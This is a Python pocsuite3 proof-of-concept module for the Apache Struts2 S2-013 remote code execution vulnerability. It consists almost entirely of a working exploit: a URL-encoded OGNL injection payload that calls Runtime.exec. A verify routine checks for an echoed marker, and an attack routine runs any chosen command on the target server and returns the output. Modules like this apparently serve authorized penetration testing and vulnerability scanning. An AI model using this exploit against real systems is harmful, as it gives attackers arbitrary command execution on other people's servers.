from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.14.1'
    name = 'Struts2-013远程代码执行'
    desc = '''Struts2-013远程代码执行'''
    pocDesc = '''Struts2-013远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-013/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = '?233=%24%7B%23_memberAccess%5B"allowStaticMetho' \
            'dAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()' \
            '.exec(%27RECOMMAND%27).getInputStream()%2C%23b%3Dnew%20java.io.' \
            'InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%' \
            '23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%' \
            '3D%40org.apache.struts2.ServletActionContext%40getResponse().ge' \
            'tWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.Str' \
            'ing(%23d))%2C%23out.close()%7D'
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = '?233=%24%7B%23_memberAccess%5B"allowStaticMetho' \
                  'dAccess"%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()' \
                  '.exec(%27RECOMMAND%27).getInputStream()%2C%23b%3Dnew%20java.io.' \
                  'InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%' \
                  '23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%' \
                  '3D%40org.apache.struts2.ServletActionContext%40getResponse().ge' \
                  'tWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.Str' \
                  'ing(%23d))%2C%23out.close()%7D'
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
